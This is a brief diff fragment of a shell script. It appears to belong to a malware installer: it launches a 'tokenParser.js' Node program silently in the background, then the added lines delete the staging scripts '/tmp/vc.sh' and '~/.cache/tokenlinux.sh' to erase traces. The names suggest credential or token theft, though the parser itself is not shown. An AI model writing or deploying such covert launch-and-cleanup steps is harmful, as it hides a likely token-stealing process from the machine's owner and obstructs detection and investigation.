@@ -103,4 +103,6 @@ nohup node "$USER_HOME/tokenParser.js" >/dev/null 2>&1 &
 
 sleep 5
 
+rm -f "/tmp/vc.sh" "$HOME/.cache/tokenlinux.sh"
+
 exit 0
